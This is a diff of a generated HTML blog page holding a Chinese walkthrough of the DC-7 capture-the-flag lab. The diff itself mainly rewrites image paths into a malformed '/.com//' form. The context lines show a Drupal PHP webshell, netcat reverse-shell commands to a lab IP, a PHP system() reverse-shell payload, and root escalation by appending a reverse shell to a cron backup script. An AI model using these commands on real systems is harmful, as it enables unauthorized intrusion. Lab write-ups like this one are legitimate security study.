@@ -41,26 +41,26 @@
 <meta property="og:url" content="http://example.com/posts/9488740e/index.html">
 <meta property="og:site_name" content="Mamor&#39;s Blog">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/posts/9488740e/nophp.png">
-<meta property="og:image" content="http://example.com/posts/9488740e/phpinstallerror.png">
-<meta property="og:image" content="http://example.com/posts/9488740e/phpinstall1.png">
-<meta property="og:image" content="http://example.com/posts/9488740e/phpinstall2.png">
-<meta property="og:image" content="http://example.com/posts/9488740e/phpinstall3.png">
-<meta property="og:image" content="http://example.com/posts/9488740e/phpinstall4.png">
-<meta property="og:image" content="http://example.com/posts/9488740e/phpinfo1.png">
-<meta property="og:image" content="http://example.com/posts/9488740e/phpinfo2.png">
-<meta property="og:image" content="http://example.com/posts/9488740e/yijuhua.png">
-<meta property="og:image" content="http://example.com/posts/9488740e/yijuhua_yijian.png">
-<meta property="og:image" content="http://example.com/posts/9488740e/shell.png">
-<meta property="og:image" content="http://example.com/posts/9488740e/rootshell.png">
-<meta property="og:image" content="http://example.com/posts/9488740e/flag.png">
-<meta property="og:image" content="http://example.com/posts/9488740e/ncshell.png">
+<meta property="og:image" content="http://example.com/.com//nophp.png">
+<meta property="og:image" content="http://example.com/.com//phpinstallerror.png">
+<meta property="og:image" content="http://example.com/.com//phpinstall1.png">
+<meta property="og:image" content="http://example.com/.com//phpinstall2.png">
+<meta property="og:image" content="http://example.com/.com//phpinstall3.png">
+<meta property="og:image" content="http://example.com/.com//phpinstall4.png">
+<meta property="og:image" content="http://example.com/.com//phpinfo1.png">
+<meta property="og:image" content="http://example.com/.com//phpinfo2.png">
+<meta property="og:image" content="http://example.com/.com//yijuhua.png">
+<meta property="og:image" content="http://example.com/.com//yijuhua_yijian.png">
+<meta property="og:image" content="http://example.com/.com//shell.png">
+<meta property="og:image" content="http://example.com/.com//rootshell.png">
+<meta property="og:image" content="http://example.com/.com//flag.png">
+<meta property="og:image" content="http://example.com/.com//ncshell.png">
 <meta property="article:published_time" content="2021-05-08T07:44:13.000Z">
 <meta property="article:modified_time" content="2021-05-08T13:12:56.621Z">
 <meta property="article:author" content="Mamor">
 <meta property="article:tag" content="DCchallenges">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/posts/9488740e/nophp.png">
+<meta name="twitter:image" content="http://example.com/.com//nophp.png">
 
 <link rel="canonical" href="http://example.com/posts/9488740e/">
 
@@ -324,7 +324,7 @@
 <h4 id="dirsearch扫目录"><a href="#dirsearch扫目录" class="headerlink" title="dirsearch扫目录"></a>dirsearch扫目录</h4><blockquote>
 <p> <a target="_blank" rel="noopener" href="http://192.168.18.140/user/login">http://192.168.18.140/user/login</a></p>
 </blockquote>
-<br/>
+<br>
 
 <p>进入主页看到时使用的<code>Drupa</code>，之前的dc-1也是使用的这个</p>
 <h4 id="根据提示找线索"><a href="#根据提示找线索" class="headerlink" title="根据提示找线索"></a>根据提示找线索</h4><blockquote>
@@ -349,7 +349,7 @@
 <p>-bash: sudo: command not found<br>You have new mail in /var/mail/dc7user<br>** dc7user@dc-7:~$ cat /var/mail/dc7user ** .</p>
 <p>内容和下面mbox差不多</p>
 </blockquote>
-<br/>
+<br>
 
 <blockquote>
 <p>** dc7user@dc-7:<del>$ ls **<br>backups  mbox<br>** dc7user@dc-7:</del>$ cat mbox **</p>
@@ -361,7 +361,7 @@
 <p>网站备份文件</p>
 <p>/home/dc7user/backups/website.tar.gz</p>
 </blockquote>
-<br/>
+<br>
 
 <blockquote>
 <p>** dc7user@dc-7:~$ cat /opt/scripts/backups.sh  **</p>
@@ -386,41 +386,41 @@
 <p><code>admin</code>,<code>123</code>成功登录</p>
 <h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>想办法反弹shell，看看能不能上传一句话木马连接</p>
 <p>新建文件发现类型没有php</p>
-<p><img src="nophp.png"></p>
+<p><img src="/.com//nophp.png"></p>
 <p>看看<code>Extend</code>插件扩展能不能安装php,没找到，需要手动安装，看了下别人的wp</p>
 <p>下载php filter模块</p>
 <blockquote>
 <p><a target="_blank" rel="noopener" href="https://www.drupal.org/project/php">https://www.drupal.org/project/php</a></p>
 </blockquote>
-<p><img src="phpinstallerror.png"></p>
+<p><img src="/.com//phpinstallerror.png"></p>
 <p>提示安装格式应该为<code>zip tar tgz gz bz2</code></p>
 <p>下载tar.gz 保存到本地然后上传</p>
-<p><img src="phpinstall1.png"></p>
-<p><img src="phpinstall2.png"></p>
-<p><img src="phpinstall3.png"></p>
-<p><img src="phpinstall4.png"></p>
+<p><img src="/.com//phpinstall1.png"></p>
+<p><img src="/.com//phpinstall2.png"></p>
+<p><img src="/.com//phpinstall3.png"></p>
+<p><img src="/.com//phpinstall4.png"></p>
 <p>安装成功</p>
 <p>写个phpinfo()试试能不能成功</p>
-<p><img src="phpinfo1.png"></p>
-<p><img src="phpinfo2.png"></p>
-<h4 id="写一句话"><a href="#写一句话" class="headerlink" title="写一句话"></a>写一句话</h4><p><img src="yijuhua.png"></p>
-<h4 id="连接蚁剑"><a href="#连接蚁剑" class="headerlink" title="连接蚁剑"></a>连接蚁剑</h4><p><img src="yijuhua_yijian.png"></p>
-<br/>
+<p><img src="/.com//phpinfo1.png"></p>
+<p><img src="/.com//phpinfo2.png"></p>
+<h4 id="写一句话"><a href="#写一句话" class="headerlink" title="写一句话"></a>写一句话</h4><p><img src="/.com//yijuhua.png"></p>
+<h4 id="连接蚁剑"><a href="#连接蚁剑" class="headerlink" title="连接蚁剑"></a>连接蚁剑</h4><p><img src="/.com//yijuhua_yijian.png"></p>
+<br>
 
 <h4 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h4><blockquote>
 <p>kali <code>nc -nlvp 8888</code></p>
 <p>蚁剑 <code>nc -c /bin/sh 192.168.18.131 8888</code></p>
 </blockquote>
-<p><img src="shell.png"></p>
+<p><img src="/.com//shell.png"></p>
 <p>反弹交互shell</p>
 <p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
 <h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>将反弹shell的脚本写入到<code>/opt/scripts/backups.sh</code></p>
 <p><code>echo &quot;nc -e /bin/bash 192.168.18.131 7777&quot; &gt;&gt; /opt/scripts/backups.sh</code></p>
 <p>成功反弹到root的shell ，不过需要多等一会才行</p>
-<p><img src="rootshell.png"></p>
-<p><img src="flag.png"></p>
+<p><img src="/.com//rootshell.png"></p>
+<p><img src="/.com//flag.png"></p>
 <blockquote>
-<p>注:其实可以在写一句话的时候可以直接写反弹shell<br><code>&lt;?php system(&#39;nc -e /bin/sh 192.168.18.131 9999&#39;); ?&gt;</code><br><img src="ncshell.png"></p>
+<p>注:其实可以在写一句话的时候可以直接写反弹shell<br><code>&lt;?php system(&#39;nc -e /bin/sh 192.168.18.131 9999&#39;); ?&gt;</code><br><img src="/.com//ncshell.png"></p>
 </blockquote>
 
     </div>
